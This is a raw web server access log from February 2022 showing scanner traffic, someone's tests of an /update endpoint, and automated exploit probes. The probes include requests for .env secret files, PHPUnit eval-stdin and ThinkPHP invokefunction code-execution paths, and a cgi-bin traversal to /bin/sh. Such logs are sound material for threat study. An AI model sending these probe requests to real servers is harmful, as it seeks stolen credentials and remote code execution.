50.31.21.9 - - [12/Feb/2022:08:20:33 +0000] "POST /sdk HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
50.31.21.9 - - [12/Feb/2022:08:20:34 +0000] "GET /nmaplowercheck1644654033 HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
50.31.21.9 - - [12/Feb/2022:08:20:34 +0000] "GET /evox/about HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
50.31.21.9 - - [12/Feb/2022:08:20:34 +0000] "HEAD / HTTP/1.1" 200 167 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
50.31.21.9 - - [12/Feb/2022:08:20:34 +0000] "GET /HNAP1 HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
50.31.21.9 - - [12/Feb/2022:08:20:34 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
187.19.203.238 - - [12/Feb/2022:08:34:17 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
197.184.179.70 - - [12/Feb/2022:09:16:10 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
197.184.179.70 - - [12/Feb/2022:09:16:13 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
109.237.103.118 - - [12/Feb/2022:09:57:41 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.142.125.212 - - [12/Feb/2022:10:16:45 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
162.142.125.212 - - [12/Feb/2022:10:16:45 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
31.220.3.140 - - [12/Feb/2022:10:48:19 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 zgrab/0.x"
185.186.51.191 - - [12/Feb/2022:10:56:55 +0000] "GET / HTTP/1.1" 200 245 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
184.105.139.70 - - [12/Feb/2022:11:13:01 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
109.237.103.123 - - [12/Feb/2022:11:15:03 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.61.172.7 - - [12/Feb/2022:11:37:45 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.61.172.7 - - [12/Feb/2022:11:37:45 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.144.21.56 - - [12/Feb/2022:12:02:21 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
195.144.21.56 - - [12/Feb/2022:12:02:21 +0000] "GET /robots.txt HTTP/1.1" 404 388 "-" "-"
195.144.21.56 - - [12/Feb/2022:12:02:21 +0000] "GET /sitemap.xml HTTP/1.1" 404 388 "-" "-"
195.144.21.56 - - [12/Feb/2022:12:02:21 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 388 "-" "-"
195.144.21.56 - - [12/Feb/2022:12:02:22 +0000] "GET /favicon.ico HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
109.237.103.9 - - [12/Feb/2022:13:34:22 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.203.240.156 - - [12/Feb/2022:14:12:09 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.203.240.156 - - [12/Feb/2022:14:12:09 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.125.192.78 - - [12/Feb/2022:14:28:16 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.125.192.78 - - [12/Feb/2022:14:28:17 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.209.162 - - [12/Feb/2022:15:14:52 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 388 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.146.165.37 - - [12/Feb/2022:15:23:17 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.212.219 - - [12/Feb/2022:15:48:13 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 zgrab/0.x"
183.82.109.248 - - [12/Feb/2022:16:11:20 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.146.165.37 - - [12/Feb/2022:16:11:34 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
27.43.207.204 - - [12/Feb/2022:16:29:26 +0000] "POST /HNAP1/ HTTP/1.0" 404 407 "-" "-"
103.115.125.119 - - [12/Feb/2022:16:56:21 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.146.165.37 - - [12/Feb/2022:17:10:20 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [12/Feb/2022:17:54:58 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Feb/2022:17:54:58 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.118.53.218 - - [12/Feb/2022:18:19:17 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
196.2.8.120 - - [12/Feb/2022:18:35:19 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.146.165.37 - - [12/Feb/2022:19:25:39 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [12/Feb/2022:19:46:06 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [12/Feb/2022:20:31:07 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Feb/2022:20:31:09 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
207.6.126.16 - - [12/Feb/2022:20:42:25 +0000] "GET / HTTP/1.1" 200 319 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
207.6.126.16 - - [12/Feb/2022:20:42:29 +0000] "GET /update HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
207.6.126.16 - - [12/Feb/2022:20:42:33 +0000] "GET /update?test=5 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
35.196.132.85 - - [12/Feb/2022:20:42:39 +0000] "GET /update?test=5 HTTP/1.1" 200 213 "-" "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
138.68.238.88 - - [12/Feb/2022:20:42:41 +0000] "GET / HTTP/1.1" 200 319 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
138.68.238.88 - - [12/Feb/2022:20:42:45 +0000] "GET /update?test=5 HTTP/1.1" 200 340 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:42:50 +0000] "GET /update?test=5 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:42:50 +0000] "GET /favicon.ico HTTP/1.1" 404 443 "http://159.89.54.141/update?test=5" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:42:56 +0000] "GET /update?test=69 HTTP/1.1" 200 342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
207.6.126.16 - - [12/Feb/2022:20:42:59 +0000] "GET /update?test=99 HTTP/1.1" 200 342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
174.4.193.206 - - [12/Feb/2022:20:43:01 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:07 +0000] "GET /update?test=69 HTTP/1.1" 200 342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:07 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:08 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:08 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:08 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:08 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:08 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:08 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:08 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:09 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:09 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:09 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:09 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:09 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:10 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:10 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:10 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:10 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:11 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:11 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:11 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:11 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:11 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:12 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:12 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:12 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:12 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:12 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:13 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:13 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:13 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:13 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:13 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:14 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:14 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:14 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:14 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:14 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:14 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:15 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:15 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:15 +0000] "GET /update?test=69 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:18 +0000] "GET /update?test=l HTTP/1.1" 200 340 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:25 +0000] "GET /update?test=hello HTTP/1.1" 200 345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
174.4.193.206 - - [12/Feb/2022:20:43:30 +0000] "GET /update?test=apple HTTP/1.1" 200 344 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
107.184.87.208 - - [12/Feb/2022:20:57:07 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.146.165.37 - - [12/Feb/2022:20:58:43 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
115.178.96.7 - - [12/Feb/2022:21:07:57 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.146.165.37 - - [12/Feb/2022:21:27:25 +0000] "GET / HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [12/Feb/2022:23:31:24 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Feb/2022:23:31:25 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.134.134 - - [13/Feb/2022:00:13:28 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:02:31:23 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:02:31:27 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.105.247.254 - - [13/Feb/2022:04:34:50 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
167.94.138.46 - - [13/Feb/2022:05:03:12 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
167.94.138.46 - - [13/Feb/2022:05:03:13 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
103.203.56.1 - - [13/Feb/2022:05:13:22 +0000] "GET / HTTP/1.1" 200 208 "-" "HTTP Banner Detection (https://security.ipip.net)"
185.254.196.223 - - [13/Feb/2022:05:31:43 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.199.107.58 - - [13/Feb/2022:05:31:43 +0000] "GET /hudson HTTP/1.1" 404 388 "-" "Mozilla/5.0 zgrab/0.x"
185.254.196.223 - - [13/Feb/2022:05:31:46 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.233.62.116 - - [13/Feb/2022:06:22:43 +0000] "GET / HTTP/1.1" 200 319 "-" "python-requests/2.27.1"
207.6.126.16 - - [13/Feb/2022:07:44:54 +0000] "GET /update?test=66 HTTP/1.1" 200 342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
207.6.126.16 - - [13/Feb/2022:07:45:15 +0000] "GET /update?test=24 HTTP/1.1" 200 342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
20.126.115.127 - - [13/Feb/2022:07:53:50 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla 5/0"
20.126.115.127 - - [13/Feb/2022:07:53:50 +0000] "GET /vendor/phpunit/phpunit/phpunit.xml HTTP/1.1" 404 444 "-" "Mozilla 5/0"
185.254.196.223 - - [13/Feb/2022:08:30:40 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:08:30:42 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.212.81 - - [13/Feb/2022:08:41:24 +0000] "GET /portal/redlion HTTP/1.1" 404 388 "-" "Mozilla/5.0 zgrab/0.x"
